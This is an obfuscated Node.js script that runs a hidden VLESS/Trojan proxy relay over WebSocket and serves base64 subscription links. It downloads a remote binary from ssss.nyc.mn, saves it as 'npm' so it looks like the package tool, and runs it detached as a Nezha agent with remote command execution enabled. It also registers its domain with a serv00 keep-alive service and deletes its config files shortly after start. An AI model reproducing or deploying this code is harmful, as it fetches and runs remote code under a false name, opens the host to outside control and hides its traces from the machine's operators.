const _0x589a7e=_0x43ac;(function(_0x3069fb,_0x564187){const _0x37bc68=_0x43ac,_0xfb329d=_0x3069fb();while(!![]){try{const _0x16cb16=parseInt(_0x37bc68(0x1f6))/0x1*(-parseInt(_0x37bc68(0x213))/0x2)+-parseInt(_0x37bc68(0x205))/0x3*(-parseInt(_0x37bc68(0x1f7))/0x4)+parseInt(_0x37bc68(0x230))/0x5*(-parseInt(_0x37bc68(0x220))/0x6)+parseInt(_0x37bc68(0x1cf))/0x7+parseInt(_0x37bc68(0x1d1))/0x8+-parseInt(_0x37bc68(0x23d))/0x9*(parseInt(_0x37bc68(0x1f1))/0xa)+-parseInt(_0x37bc68(0x211))/0xb*(-parseInt(_0x37bc68(0x233))/0xc);if(_0x16cb16===_0x564187)break;else _0xfb329d['push'](_0xfb329d['shift']());}catch(_0x21e681){_0xfb329d['push'](_0xfb329d['shift']());}}}(_0x265e,0xc09c0));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x589a7e(0x238)),net=require(_0x589a7e(0x241)),path=require('path'),crypto=require(_0x589a7e(0x225)),{Buffer}=require(_0x589a7e(0x1ea)),{exec,execSync}=require(_0x589a7e(0x227)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0x589a7e(0x1e0)]||_0x589a7e(0x1ca),NEZHA_SERVER=process[_0x589a7e(0x1e9)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x589a7e(0x1e9)][_0x589a7e(0x224)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process[_0x589a7e(0x1e9)][_0x589a7e(0x236)]||'1234.abc.com',AUTO_ACCESS=process['env'][_0x589a7e(0x1e1)]||!![],WSPATH=process['env']['WSPATH']||UUID[_0x589a7e(0x22c)](0x0,0x8),SUB_PATH=process[_0x589a7e(0x1e9)][_0x589a7e(0x207)]||_0x589a7e(0x1d2),NAME=process[_0x589a7e(0x1e9)][_0x589a7e(0x1e2)]||'',PORT=process[_0x589a7e(0x1e9)][_0x589a7e(0x1d6)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x21bc09=_0x589a7e;try{const _0xd03e35=await axios[_0x21bc09(0x221)](_0x21bc09(0x218)),_0x5dd5d3=_0xd03e35['data'];ISP=(_0x5dd5d3['country_code']+'-'+_0x5dd5d3[_0x21bc09(0x1f8)])[_0x21bc09(0x1dd)](/ /g,'_');}catch(_0x3df67b){ISP=_0x21bc09(0x1f9);}};GetISP();function _0x265e(){const _0x18670f=['length','from','https://oooo.serv00.net/add-url','147uNVTcp','1076tZAOct','isp','Unknown','connect','connection','update','error','https://dns.google/resolve?name=','message','&fp=chrome&type=ws&host=','&type=A','trim','application/json','&path=%2F','3711IhLyeV','\x20-p\x20','SUB_PATH','arch','data','error:\x20','npm','--tls','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','index.html','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','\x20with\x20all\x20DNS\x20servers','770VpcNRs','unlink','7174FoRRqc','close','client_secret:\x20','join','aarch64','https://api.ip.sb/geoip','Automatic\x20Access\x20Task\x20added\x20successfully','map','npm\x20running\x20error:','2087','end','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','reduce','30XRnils','get','includes','digest','NEZHA_PORT','crypto','https://arm64.ssss.nyc.mn/v1','child_process','hex','Answer','write','substr','slice','every','config.yaml','catch','447715VbJswQ','https://amd64.ssss.nyc.mn/agent','pipe','136644Gmowzm','2096','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','DOMAIN','log','axios','createHash','https://arm64.ssss.nyc.mn/agent','/bin/bash','readFile','1075527gqXkjY','2083','pop','then','net','finish','text/plain','Status','once','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','base64','7a76ae72-20f9-4ac3-9079-a1cc01b6ea26','type','https://amd64.ssss.nyc.mn/v1','concat','url','3717280jEPHvf','https://','7516560NUNpQx','sub','readUInt16BE','1.1.1.1','text/html','PORT','decode','npm\x20is\x20already\x20running,\x20skip\x20running...','setsid\x20nohup\x20./npm\x20-s\x20','test','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','chmod\x20+x\x20npm','replace','toString','application/dns-json','UUID','AUTO_ACCESS','NAME','8.8.4.4','post',':443?encryption=none&security=tls&sni=','readUInt8','find','npm\x20download\x20successfully','env','buffer','false','stream','vless://','createServer','Not\x20Found\x0a','Failed\x20to\x20resolve\x20','70TinOSS','writeHead'];_0x265e=function(){return _0x18670f;};return _0x265e();}function _0x43ac(_0x338477,_0x428159){_0x338477=_0x338477-0x1c4;const _0x265e01=_0x265e();let _0x43acec=_0x265e01[_0x338477];return _0x43acec;}const httpServer=http[_0x589a7e(0x1ee)]((_0x5a25e7,_0x18b8df)=>{const _0x4e970c=_0x589a7e;if(_0x5a25e7[_0x4e970c(0x1ce)]==='/'){const _0x13bf74=path[_0x4e970c(0x216)](__dirname,_0x4e970c(0x20e));fs[_0x4e970c(0x23c)](_0x13bf74,'utf8',(_0x2f5105,_0x269588)=>{const _0x3dba9a=_0x4e970c;if(_0x2f5105){_0x18b8df[_0x3dba9a(0x1f2)](0xc8,{'Content-Type':'text/html'}),_0x18b8df[_0x3dba9a(0x21d)]('Hello\x20world!');return;}_0x18b8df[_0x3dba9a(0x1f2)](0xc8,{'Content-Type':_0x3dba9a(0x1d5)}),_0x18b8df[_0x3dba9a(0x21d)](_0x269588);});return;}else{if(_0x5a25e7[_0x4e970c(0x1ce)]==='/'+SUB_PATH){const _0x4fdd2e=NAME?NAME+'-'+ISP:ISP,_0x135c9c=_0x4e970c(0x1ed)+UUID+'@'+DOMAIN+_0x4e970c(0x1e5)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x4fdd2e,_0x198ba5='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x4e970c(0x200)+DOMAIN+_0x4e970c(0x204)+WSPATH+'#'+_0x4fdd2e,_0x3f40eb=_0x135c9c+'\x0a'+_0x198ba5,_0x1c9c25=Buffer[_0x4e970c(0x1f4)](_0x3f40eb)[_0x4e970c(0x1de)](_0x4e970c(0x1c9));_0x18b8df['writeHead'](0xc8,{'Content-Type':_0x4e970c(0x1c5)}),_0x18b8df['end'](_0x1c9c25+'\x0a');}else _0x18b8df['writeHead'](0x194,{'Content-Type':'text/plain'}),_0x18b8df[_0x4e970c(0x21d)](_0x4e970c(0x1ef));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x589a7e(0x1e3),_0x589a7e(0x1d4)];function resolveHost(_0x3ed7b4){return new Promise((_0x5cfda4,_0x21b661)=>{const _0x3981f1=_0x43ac;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x3981f1(0x1da)](_0x3ed7b4)){_0x5cfda4(_0x3ed7b4);return;}let _0x9fefa2=0x0;function _0xd833e8(){const _0x31b6cd=_0x3981f1;if(_0x9fefa2>=DNS_SERVERS[_0x31b6cd(0x1f3)]){_0x21b661(new Error(_0x31b6cd(0x1f0)+_0x3ed7b4+_0x31b6cd(0x210)));return;}const _0x1cf4c7=DNS_SERVERS[_0x9fefa2];_0x9fefa2++;const _0x181997=_0x31b6cd(0x1fe)+encodeURIComponent(_0x3ed7b4)+_0x31b6cd(0x201);axios[_0x31b6cd(0x221)](_0x181997,{'timeout':0x1388,'headers':{'Accept':_0x31b6cd(0x1df)}})[_0x31b6cd(0x240)](_0x5d3d67=>{const _0x1f6d54=_0x31b6cd,_0x6627b2=_0x5d3d67['data'];if(_0x6627b2[_0x1f6d54(0x1c6)]===0x0&&_0x6627b2[_0x1f6d54(0x229)]&&_0x6627b2[_0x1f6d54(0x229)][_0x1f6d54(0x1f3)]>0x0){const _0xc22a35=_0x6627b2['Answer'][_0x1f6d54(0x1e7)](_0x115db3=>_0x115db3[_0x1f6d54(0x1cb)]===0x1);if(_0xc22a35){_0x5cfda4(_0xc22a35[_0x1f6d54(0x209)]);return;}}_0xd833e8();})[_0x31b6cd(0x22f)](_0x537c73=>{_0xd833e8();});}_0xd833e8();});}function handleVlessConnection(_0x581e5b,_0x532eba){const _0x2c58de=_0x589a7e,[_0x48a0e0]=_0x532eba,_0x127484=_0x532eba[_0x2c58de(0x22c)](0x1,0x11);if(!_0x127484[_0x2c58de(0x22d)]((_0x4c7675,_0x1f5674)=>_0x4c7675==parseInt(uuid[_0x2c58de(0x22b)](_0x1f5674*0x2,0x2),0x10)))return![];let _0x300195=_0x532eba[_0x2c58de(0x22c)](0x11,0x12)[_0x2c58de(0x1e6)]()+0x13;const _0xfd19d3=_0x532eba[_0x2c58de(0x22c)](_0x300195,_0x300195+=0x2)['readUInt16BE'](0x0),_0x5a44aa=_0x532eba['slice'](_0x300195,_0x300195+=0x1)[_0x2c58de(0x1e6)](),_0x100f87=_0x5a44aa==0x1?_0x532eba[_0x2c58de(0x22c)](_0x300195,_0x300195+=0x4)[_0x2c58de(0x216)]('.'):_0x5a44aa==0x2?new TextDecoder()[_0x2c58de(0x1d7)](_0x532eba['slice'](_0x300195+0x1,_0x300195+=0x1+_0x532eba['slice'](_0x300195,_0x300195+0x1)[_0x2c58de(0x1e6)]())):_0x5a44aa==0x3?_0x532eba['slice'](_0x300195,_0x300195+=0x10)[_0x2c58de(0x21f)]((_0x16b36d,_0x4ec123,_0x714b15,_0x53f0bf)=>_0x714b15%0x2?_0x16b36d['concat'](_0x53f0bf[_0x2c58de(0x22c)](_0x714b15-0x1,_0x714b15+0x1)):_0x16b36d,[])[_0x2c58de(0x21a)](_0x59dc20=>_0x59dc20[_0x2c58de(0x1d3)](0x0)[_0x2c58de(0x1de)](0x10))[_0x2c58de(0x216)](':'):'';_0x581e5b['send'](new Uint8Array([_0x48a0e0,0x0]));const _0x1a9128=createWebSocketStream(_0x581e5b);return resolveHost(_0x100f87)[_0x2c58de(0x240)](_0x19d0c1=>{const _0x5431f5=_0x2c58de;net[_0x5431f5(0x1fa)]({'host':_0x19d0c1,'port':_0xfd19d3},function(){const _0x27da5b=_0x5431f5;this[_0x27da5b(0x22a)](_0x532eba[_0x27da5b(0x22c)](_0x300195)),_0x1a9128['on'](_0x27da5b(0x1fd),()=>{})[_0x27da5b(0x232)](this)['on'](_0x27da5b(0x1fd),()=>{})['pipe'](_0x1a9128);})['on'](_0x5431f5(0x1fd),()=>{});})['catch'](_0x3e981f=>{const _0x3f7008=_0x2c58de;net[_0x3f7008(0x1fa)]({'host':_0x100f87,'port':_0xfd19d3},function(){const _0x3e4004=_0x3f7008;this['write'](_0x532eba['slice'](_0x300195)),_0x1a9128['on'](_0x3e4004(0x1fd),()=>{})['pipe'](this)['on'](_0x3e4004(0x1fd),()=>{})[_0x3e4004(0x232)](_0x1a9128);})['on'](_0x3f7008(0x1fd),()=>{});}),!![];}function handleTrojanConnection(_0x5da34d,_0x694089){const _0x23fab2=_0x589a7e;try{if(_0x694089[_0x23fab2(0x1f3)]<0x3a)return![];const _0x183398=_0x694089[_0x23fab2(0x22c)](0x0,0x38)['toString'](),_0x3b0742=[UUID];let _0x28cbe9=null;for(const _0x5e6a07 of _0x3b0742){const _0x3de0f9=crypto[_0x23fab2(0x239)]('sha224')[_0x23fab2(0x1fc)](_0x5e6a07)[_0x23fab2(0x223)](_0x23fab2(0x228));if(_0x3de0f9===_0x183398){_0x28cbe9=_0x5e6a07;break;}}if(!_0x28cbe9)return![];let _0x314fcb=0x38;_0x694089[_0x314fcb]===0xd&&_0x694089[_0x314fcb+0x1]===0xa&&(_0x314fcb+=0x2);const _0x1080c6=_0x694089[_0x314fcb];if(_0x1080c6!==0x1)return![];_0x314fcb+=0x1;const _0x431f8f=_0x694089[_0x314fcb];_0x314fcb+=0x1;let _0x32ba87,_0x326a28;if(_0x431f8f===0x1)_0x32ba87=_0x694089[_0x23fab2(0x22c)](_0x314fcb,_0x314fcb+0x4)[_0x23fab2(0x216)]('.'),_0x314fcb+=0x4;else{if(_0x431f8f===0x3){const _0x18b496=_0x694089[_0x314fcb];_0x314fcb+=0x1,_0x32ba87=_0x694089['slice'](_0x314fcb,_0x314fcb+_0x18b496)[_0x23fab2(0x1de)](),_0x314fcb+=_0x18b496;}else{if(_0x431f8f===0x4)_0x32ba87=_0x694089['slice'](_0x314fcb,_0x314fcb+0x10)[_0x23fab2(0x21f)]((_0x2a0786,_0x46efae,_0x492297,_0x384849)=>_0x492297%0x2?_0x2a0786[_0x23fab2(0x1cd)](_0x384849[_0x23fab2(0x22c)](_0x492297-0x1,_0x492297+0x1)):_0x2a0786,[])[_0x23fab2(0x21a)](_0x14ea9e=>_0x14ea9e[_0x23fab2(0x1d3)](0x0)[_0x23fab2(0x1de)](0x10))[_0x23fab2(0x216)](':'),_0x314fcb+=0x10;else return![];}}_0x326a28=_0x694089['readUInt16BE'](_0x314fcb),_0x314fcb+=0x2;_0x314fcb<_0x694089[_0x23fab2(0x1f3)]&&_0x694089[_0x314fcb]===0xd&&_0x694089[_0x314fcb+0x1]===0xa&&(_0x314fcb+=0x2);const _0x1d7fa7=createWebSocketStream(_0x5da34d);return resolveHost(_0x32ba87)[_0x23fab2(0x240)](_0x497659=>{const _0x4692ea=_0x23fab2;net[_0x4692ea(0x1fa)]({'host':_0x497659,'port':_0x326a28},function(){const _0x435a1d=_0x4692ea;_0x314fcb<_0x694089[_0x435a1d(0x1f3)]&&this[_0x435a1d(0x22a)](_0x694089[_0x435a1d(0x22c)](_0x314fcb)),_0x1d7fa7['on'](_0x435a1d(0x1fd),()=>{})[_0x435a1d(0x232)](this)['on'](_0x435a1d(0x1fd),()=>{})['pipe'](_0x1d7fa7);})['on'](_0x4692ea(0x1fd),()=>{});})[_0x23fab2(0x22f)](_0x2d60dd=>{const _0xdfcf16=_0x23fab2;net['connect']({'host':_0x32ba87,'port':_0x326a28},function(){const _0x53180b=_0x43ac;_0x314fcb<_0x694089['length']&&this['write'](_0x694089[_0x53180b(0x22c)](_0x314fcb)),_0x1d7fa7['on'](_0x53180b(0x1fd),()=>{})[_0x53180b(0x232)](this)['on']('error',()=>{})[_0x53180b(0x232)](_0x1d7fa7);})['on'](_0xdfcf16(0x1fd),()=>{});}),!![];}catch(_0x19ad9c){return![];}}wss['on'](_0x589a7e(0x1fb),(_0x4460a3,_0x5389d3)=>{const _0x8a4356=_0x589a7e,_0x2b964e=_0x5389d3['url']||'';_0x4460a3[_0x8a4356(0x1c7)](_0x8a4356(0x1ff),_0x52b842=>{const _0x42ca4a=_0x8a4356;if(_0x52b842[_0x42ca4a(0x1f3)]>0x11&&_0x52b842[0x0]===0x0){const _0x1aaa97=_0x52b842[_0x42ca4a(0x22c)](0x1,0x11),_0x3a21bf=_0x1aaa97['every']((_0x4822fa,_0xfb061b)=>_0x4822fa==parseInt(uuid[_0x42ca4a(0x22b)](_0xfb061b*0x2,0x2),0x10));if(_0x3a21bf){!handleVlessConnection(_0x4460a3,_0x52b842)&&_0x4460a3[_0x42ca4a(0x214)]();return;}}!handleTrojanConnection(_0x4460a3,_0x52b842)&&_0x4460a3[_0x42ca4a(0x214)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x5c5762=_0x589a7e,_0x1f1718=os[_0x5c5762(0x208)]();return _0x1f1718==='arm'||_0x1f1718==='arm64'||_0x1f1718===_0x5c5762(0x217)?!NEZHA_PORT?_0x5c5762(0x226):_0x5c5762(0x23a):!NEZHA_PORT?_0x5c5762(0x1cc):_0x5c5762(0x231);},downloadFile=async()=>{const _0x2718ef=_0x589a7e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x292e74=getDownloadUrl(),_0x2a3cd0=await axios({'method':'get','url':_0x292e74,'responseType':_0x2718ef(0x1ec)}),_0x27427f=fs['createWriteStream']('npm');return _0x2a3cd0[_0x2718ef(0x209)][_0x2718ef(0x232)](_0x27427f),new Promise((_0x186c37,_0x41b3fe)=>{const _0x22c7b2=_0x2718ef;_0x27427f['on'](_0x22c7b2(0x1c4),()=>{const _0x50e100=_0x22c7b2;console['log'](_0x50e100(0x1e8)),exec(_0x50e100(0x1dc),_0x533f29=>{if(_0x533f29)_0x41b3fe(_0x533f29);_0x186c37();});}),_0x27427f['on'](_0x22c7b2(0x1fd),_0x41b3fe);});}catch(_0x1bcf92){throw _0x1bcf92;}},runnz=async()=>{const _0xbb41ae=_0x589a7e;try{const _0x2314b3=execSync(_0xbb41ae(0x1c8),{'encoding':'utf-8'});if(_0x2314b3[_0xbb41ae(0x202)]()!==''){console[_0xbb41ae(0x237)](_0xbb41ae(0x1d8));return;}}catch(_0x2b5c47){}await downloadFile();let _0x292cf8='',_0x257731=['443','8443',_0xbb41ae(0x234),_0xbb41ae(0x21c),_0xbb41ae(0x23e),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xe3def0=_0x257731[_0xbb41ae(0x222)](NEZHA_PORT)?_0xbb41ae(0x20c):'';_0x292cf8=_0xbb41ae(0x1d9)+NEZHA_SERVER+':'+NEZHA_PORT+_0xbb41ae(0x206)+NEZHA_KEY+'\x20'+_0xe3def0+_0xbb41ae(0x21e);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1504e3=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0xbb41ae(0x23f)]():'',_0x54fe7f=_0x257731['includes'](_0x1504e3)?'true':_0xbb41ae(0x1eb),_0x357951=_0xbb41ae(0x215)+NEZHA_KEY+_0xbb41ae(0x235)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x54fe7f+_0xbb41ae(0x1db)+UUID;fs['writeFileSync']('config.yaml',_0x357951);}_0x292cf8=_0xbb41ae(0x20f);}else{console[_0xbb41ae(0x237)](_0xbb41ae(0x20d));return;}}try{exec(_0x292cf8,{'shell':_0xbb41ae(0x23b)},_0x32a3d5=>{const _0x40e277=_0xbb41ae;if(_0x32a3d5)console[_0x40e277(0x1fd)](_0x40e277(0x21b),_0x32a3d5);else console[_0x40e277(0x237)]('npm\x20is\x20running');});}catch(_0x392333){console[_0xbb41ae(0x1fd)](_0xbb41ae(0x20a)+_0x392333);}};async function addAccessTask(){const _0x37b288=_0x589a7e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x214695=_0x37b288(0x1d0)+DOMAIN;try{const _0x37e7ff=await axios[_0x37b288(0x1e4)](_0x37b288(0x1f5),{'url':_0x214695},{'headers':{'Content-Type':_0x37b288(0x203)}});console[_0x37b288(0x237)](_0x37b288(0x219));}catch(_0x7e5d96){}}const delFiles=()=>{const _0x18eeb4=_0x589a7e;fs[_0x18eeb4(0x212)](_0x18eeb4(0x20b),()=>{}),fs[_0x18eeb4(0x212)](_0x18eeb4(0x22e),()=>{});};httpServer['listen'](PORT,()=>{const _0x2ca01e=_0x589a7e;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2ca01e(0x237)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
